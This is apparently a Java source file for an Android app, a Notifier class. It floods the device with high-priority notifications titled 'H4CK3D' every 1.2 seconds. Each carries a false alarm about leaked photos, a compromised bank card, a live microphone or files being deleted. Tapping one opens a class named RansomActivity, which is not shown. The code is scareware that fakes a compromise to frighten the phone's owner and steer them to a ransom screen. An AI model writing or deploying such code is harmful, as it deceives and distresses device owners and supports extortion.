public final class Notifier {

    private static final String CH = "PWNED";
    private static final Handler H = new Handler(Looper.getMainLooper());
    private static volatile boolean running;
    private static int id = 200;

    private static final String[] TEXTS = {
            "VIRUS DETECTED: 214 photos leaked to Telegram",
            "WhatsApp database exfiltrated",
            "BANK APP TROJAN: card ****4821 compromised",
            "your microphone is LIVE - recording now",
            "files deleting 3... 2... 1...",
            "SIM swap detected - you are being tracked",
            "root shell acquired - do not power off"
    };

    public static void start(final Context c) {
        if (running) return;
        running = true;

        final NotificationManager nm =
                (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
        if (nm == null) return;

        if (Build.VERSION.SDK_INT >= 26) {
            nm.createNotificationChannel(
                    new NotificationChannel(CH, "PWNED", NotificationManager.IMPORTANCE_HIGH));
        }

        final Random r = new Random();
        Runnable task = new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                try {
                    Notification.Builder b = (Build.VERSION.SDK_INT >= 26)
                            ? new Notification.Builder(c, CH)
                            : new Notification.Builder(c);
                    b.setContentTitle("H4CK3D")
                     .setContentText(TEXTS[r.nextInt(TEXTS.length)])
                     .setSmallIcon(android.R.drawable.stat_notify_error)
                     .setAutoCancel(true);
                    b.setPriority(Notification.PRIORITY_HIGH);

                    Intent i = new Intent(c, RansomActivity.class);
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    b.setContentIntent(PendingIntent.getActivity(c, 0, i,
                            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE));

                    nm.notify(id++, b.build());
                } catch (Exception ignored) {
                }
                H.postDelayed(this, 1200);
            }
        };
        H.post(task);
    }

    public static void stop(Context c) {
        running = false;
        H.removeCallbacksAndMessages(null);
        try {
            NotificationManager nm =
                    (NotificationManager) c.getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) nm.cancelAll();
        } catch (Exception ignored) {
        }
    }
}
